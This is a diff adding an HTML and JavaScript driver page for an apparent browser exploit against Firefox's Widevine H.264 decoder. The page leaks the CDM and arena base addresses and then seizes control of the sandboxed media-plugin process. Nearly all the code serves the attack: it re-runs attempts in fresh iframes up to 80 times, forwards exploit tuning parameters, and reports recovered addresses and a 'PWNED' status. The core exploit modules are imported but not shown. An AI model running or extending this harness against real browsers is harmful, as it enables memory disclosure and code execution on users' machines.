@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Widevine H.264 Exploit Harness</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --panel: #161b22;
+    --border: #30363d;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --accent: #2f81f7;
+    --accent-hover: #4c97ff;
+    --ok: #2ea043;
+    --fail: #f85149;
+    --busy: #d29922;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 24px;
+    background: var(--bg);
+    color: var(--text);
+    font: 14px/1.5 system-ui, -apple-system, "Segoe UI", sans-serif;
+  }
+  header { margin-bottom: 20px; }
+  h1 {
+    margin: 0;
+    font-size: 20px;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+  }
+  header p { margin: 4px 0 0; color: var(--muted); font-size: 13px; }
+
+  .panel {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+    align-items: flex-start;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+
+  .preview { display: flex; flex-direction: column; gap: 6px; align-items: center; }
+  video {
+    width: 96px; height: 96px;
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+  }
+  .preview span { font-size: 11px; color: var(--muted); }
+
+  .controls { flex: 1; min-width: 280px; display: flex; flex-direction: column; gap: 14px; }
+  label { display: flex; flex-direction: column; gap: 5px; font-size: 12px; color: var(--muted); }
+  input[type=text], select {
+    width: 100%;
+    padding: 8px 10px;
+    background: var(--bg);
+    color: var(--text);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font: inherit;
+  }
+  input[type=text]:focus, select:focus { outline: none; border-color: var(--accent); }
+  .hint { font-size: 11px; color: var(--muted); }
+  .hint code {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 1px 5px;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+  }
+
+  .buttons { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+  button {
+    padding: 8px 18px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font: inherit;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.12s, border-color 0.12s;
+  }
+  #run { background: var(--accent); border-color: var(--accent); color: #fff; }
+  #run:hover { background: var(--accent-hover); border-color: var(--accent-hover); }
+  #stop { background: transparent; color: var(--text); }
+  #stop:hover { border-color: var(--fail); color: var(--fail); }
+
+  #status {
+    display: inline-block;
+    padding: 4px 12px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-weight: 500;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  #status.busy { color: var(--busy); border-color: var(--busy); }
+  #status.ok   { color: var(--ok);   border-color: var(--ok); }
+  #status.fail { color: var(--fail); border-color: var(--fail); }
+
+  #log {
+    background: #010409;
+    color: #c9d1d9;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px;
+    height: 420px;
+    overflow: auto;
+    white-space: pre-wrap;
+    font: 12px/1.45 ui-monospace, "SF Mono", Menlo, monospace;
+  }
+
+  #iframeSlot { margin-top: 12px; }
+  #iframeSlot iframe {
+    width: 180px; height: 180px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    opacity: 0.6;
+  }
+</style>
+</head>
+<body>
+  <header>
+    <h1>Widevine H.264 Exploit Harness</h1>
+    <p>Leak the CDM/arena base in-band, then RIP the sandboxed GMP child.</p>
+  </header>
+
+  <div class="panel">
+    <div class="preview">
+      <video id="v" autoplay muted playsinline></video>
+      <span>decoder output</span>
+    </div>
+
+    <div class="controls">
+      <label>
+        License proxy URL
+        <input id="licenseUrl" type="text" value="http://localhost:8081"
+               placeholder="http://localhost:8081">
+      </label>
+      <div class="hint">
+        Start the proxy in another terminal:
+        <code>python3 license_proxy.py</code>
+      </div>
+
+      <label>
+        Mode
+        <select id="mode">
+          <option value="full">full — leak + RIP</option>
+          <option value="leakOnly">leakOnly — recover bases only</option>
+        </select>
+      </label>
+
+      <div class="buttons">
+        <button id="run">Run</button>
+        <button id="stop">Stop</button>
+        <span id="status">idle</span>
+      </div>
+    </div>
+  </div>
+
+  <pre id="log"></pre>
+  <div id="iframeSlot"></div>
+
+<script type="module">
+import { run } from './orchestrator.js?v=v81deltasweep';
+
+const video = document.getElementById('v');
+const logEl = document.getElementById('log');
+const statusEl = document.getElementById('status');
+
+const log = (m) => {
+  logEl.textContent += m + '\n';
+  logEl.scrollTop = logEl.scrollHeight;
+  console.log('[orch] ' + m);
+  try { dump('[orch] ' + m + '\n'); } catch (_) {}
+};
+
+// status badge: kind is '' | 'busy' | 'ok' | 'fail'.
+function setStatus(text, kind = '') {
+  statusEl.textContent = text;
+  statusEl.className = kind;
+}
+
+// Run exactly one attempt (no rotation, no retry) and return the outcome.
+// Used both by the driver-iframe path (?onceOnly=1) and by the manual Run
+// button when the user just wants a single shot for debugging.
+// `attemptIdxOffset` lets the iframe driver inject its own per-iframe
+// counter so that variant rotation in leak.js actually cycles across
+// iframes (each iframe spawns a fresh orchestrator whose internal
+// `attemptIdx` would otherwise restart at 0 every time).
+async function runOnce(mode, licenseUrl, attemptIdxOffset = 0) {
+  // Pick up `?leakRounds=N` so we can flip multi-emit on without code
+  // changes. Default 1 = v78 behavior.
+  const _p = new URLSearchParams(location.search);
+  const numLeakRounds = parseInt(_p.get('leakRounds') || '1', 10) || 1;
+  return run({ video, licenseUrl, log, mode, maxAttempts: 1,
+               attemptIdxOffset, numLeakRounds });
+}
+
+// Driver path: spawn iframes in sequence, each running ?onceOnly=1. Each
+// iframe is a fresh document → fresh <video>, MediaKeys, MediaSource, EME
+// session, JS context. Solves the video.error stickiness + EME-pipeline
+// teardown issues that plague multi-attempt loops in stock Firefox.
+async function runIframeAttempt(i, mode, licenseUrl) {
+  const slot = document.getElementById('iframeSlot');
+  return new Promise((resolve) => {
+    const f = document.createElement('iframe');
+    f.allow = 'encrypted-media; autoplay';   // ignored same-origin but harmless
+    const cb = Date.now() + '-' + i;
+    // Propagate ALL parent tuning params to the iframe (the orchestrator runs
+    // INSIDE the iframe, so without this every ?setupPrimer/?ripFillers/
+    // ?primers/?ctxOff/?picbufOff/?skipKillAu/?leakRounds knob is silently
+    // ignored). Skip the ones we set ourselves below.
+    const _parentP = new URLSearchParams(location.search);
+    const _skip = new Set(['auto', 'onceOnly', 'attempt', 'license', 'cb', 'attempts']);
+    let _fwd = '';
+    for (const [k, v] of _parentP) {
+      if (_skip.has(k)) continue;
+      _fwd += `&${encodeURIComponent(k)}=${encodeURIComponent(v)}`;
+    }
+    f.src = `index.html?auto=${encodeURIComponent(mode)}&onceOnly=1&attempt=${i}&license=${encodeURIComponent(licenseUrl)}&cb=${cb}${_fwd}`;
+
+    let done = false;
+    const onMsg = (e) => {
+      if (e.source !== f.contentWindow) return;
+      if (!e.data || e.data.type !== 'attempt_done') return;
+      if (done) return;
+      done = true;
+      window.removeEventListener('message', onMsg);
+      try { slot.removeChild(f); } catch (_) {}
+      resolve(e.data);
+    };
+    window.addEventListener('message', onMsg);
+
+    // Safety timeout — if the iframe gets stuck, kill it after 90s and
+    // report a synthetic failure so the driver moves on.
+    const t = setTimeout(() => {
+      if (done) return;
+      done = true;
+      window.removeEventListener('message', onMsg);
+      try { slot.removeChild(f); } catch (_) {}
+      resolve({ type: 'attempt_done', pwned: false, timeout: true });
+    }, 90000);
+
+    slot.appendChild(f);
+  });
+}
+
+async function runIframeDriver(mode, licenseUrl, maxAttempts) {
+  log(`[driver] iframe-per-attempt mode (max ${maxAttempts})`);
+  for (let i = 0; i < maxAttempts; i++) {
+    log(`\n[driver] === iframe attempt ${i + 1}/${maxAttempts} ===`);
+    setStatus(`attempt ${i + 1}/${maxAttempts}…`, 'busy');
+    const r = await runIframeAttempt(i, mode, licenseUrl);
+    if (r.timeout) {
+      log(`[driver] attempt ${i + 1}: TIMEOUT`);
+    } else {
+      log(`[driver] attempt ${i + 1}: cdm_base=${r.cdmBase ? '0x' + r.cdmBase : 'FAIL'}` +
+          ` arena=${r.arenaBase ? '0x' + r.arenaBase : 'FAIL'}` +
+          ` pwned=${!!r.pwned}`);
+    }
+    if (r.pwned) {
+      log(`\n=== EXPLOIT SUCCEEDED on iframe attempt ${i + 1} ===`);
+      setStatus(`PWNED on attempt ${i + 1}`, 'ok');
+      return r;
+    }
+    // Let GMP child fully exit / respawn before the next iframe creates
+    // its CDM session. Same-origin iframes share the GMP plugin via
+    // nodeId (GMPServiceParent.cpp:987 SelectPluginForAPI), so we need a
+    // breath for the crashed-child respawn to complete.
+    await new Promise((r) => setTimeout(r, 500));
+  }
+  log(`\n=== ALL ${maxAttempts} IFRAME ATTEMPTS FAILED ===`);
+  setStatus('all attempts failed', 'fail');
+  return null;
+}
+
+document.getElementById('run').onclick = async () => {
+  logEl.textContent = '';
+  const mode = document.getElementById('mode').value;
+  const licenseUrl = document.getElementById('licenseUrl').value.trim();
+  setStatus(`running (${mode})…`, 'busy');
+  try {
+    const params = new URLSearchParams(location.search);
+    // Default high enough to sweep the full au5n X2-position rotation (28
+    // values, advanced every 2 attempts → ~56 attempts) for the rare arena
+    // layouts whose low au5n positions all read garbage X2 dims. Most
+    // sessions PWN within 2-6 attempts; this just covers the stubborn tail.
+    const maxAttempts = parseInt(params.get('attempts') || '80', 10);
+    const numLeakRounds = parseInt(params.get('leakRounds') || '1', 10) || 1;
+    // For full: use the iframe driver. For leakOnly we ALSO use the iframe
+    // driver so each measurement attempt starts with a fresh GMP child +
+    // fresh slab cursor — otherwise the cursor drifts and later attempts
+    // fail even when the chain is correct.
+    // Pass ?singleDoc=1 to force the legacy single-document path.
+    const singleDoc = params.get('singleDoc') === '1';
+    const result = (mode === 'full' || (mode === 'leakOnly' && !singleDoc))
+      ? await runIframeDriver(mode, licenseUrl, maxAttempts)
+      : await run({ video, licenseUrl, log, mode,
+                    maxAttempts, numLeakRounds });
+    if (result) {
+      setStatus(`cdm_base=0x${result.cdmBase?.toString(16) ?? '?'} arena=0x${result.arenaBase?.toString(16) ?? '?'}`, 'ok');
+    } else {
+      setStatus('failed', 'fail');
+    }
+  } catch (e) {
+    log(`FATAL: ${e.message}`);
+    setStatus('error', 'fail');
+  }
+};
+
+document.getElementById('stop').onclick = () => { location.reload(); };
+
+// Auto-run hook.
+//   ?auto=leakOnly|full — pick mode
+//   ?onceOnly=1         — run a single attempt then postMessage the result
+//                         to parent + don't continue. Used by the iframe driver.
+//   ?license=URL        — override license proxy URL
+//   ?attempts=N         — override iframe driver's max attempts
+(() => {
+  const params = new URLSearchParams(location.search);
+  const auto = params.get('auto');
+  if (!auto) return;
+  const mode = auto === 'full' ? 'full' : 'leakOnly';
+  const license = params.get('license');
+  if (license) document.getElementById('licenseUrl').value = license;
+  const sel = document.getElementById('mode');
+  for (const opt of sel.options) {
+    if (opt.value === mode) { sel.value = mode; break; }
+  }
+
+  const onceOnly = params.get('onceOnly') === '1';
+  console.log(`[harness] auto-running mode=${mode} onceOnly=${onceOnly}`);
+  try { dump(`[harness] auto-running mode=${mode} onceOnly=${onceOnly}\n`); } catch (_) {}
+
+  if (onceOnly && window.parent !== window) {
+    // Single-attempt iframe child: skip the UI loop, just run once and
+    // postMessage the outcome up to the parent driver. Pull the parent's
+    // per-iframe attempt index so leak.js picbufVariant rotation cycles
+    // across iframes.
+    const attemptOffset = parseInt(params.get('attempt') || '0', 10) || 0;
+    setTimeout(async () => {
+      let outcome = null;
+      try {
+        outcome = await runOnce(mode, document.getElementById('licenseUrl').value.trim(),
+                                attemptOffset);
+      } catch (e) {
+        log(`FATAL: ${e?.message ?? e}`);
+      }
+      const msg = {
+        type: 'attempt_done',
+        pwned: !!outcome?.pwned,
+        cdmBase: outcome?.cdmBase ? outcome.cdmBase.toString(16) : null,
+        arenaBase: outcome?.arenaBase ? outcome.arenaBase.toString(16) : null,
+        crashed: !!outcome?.crashed,
+      };
+      try { window.parent.postMessage(msg, '*'); } catch (_) {}
+    }, 250);
+    return;
+  }
+
+  // Top-level auto-run: trigger the normal Run button (which dispatches
+  // to runIframeDriver for full, or the inline loop for leakOnly).
+  setTimeout(() => {
+    try { dump('[harness] click() fired\n'); } catch (_) {}
+    document.getElementById('run').click();
+  }, 250);
+})();
+</script>
+</body>
+</html>
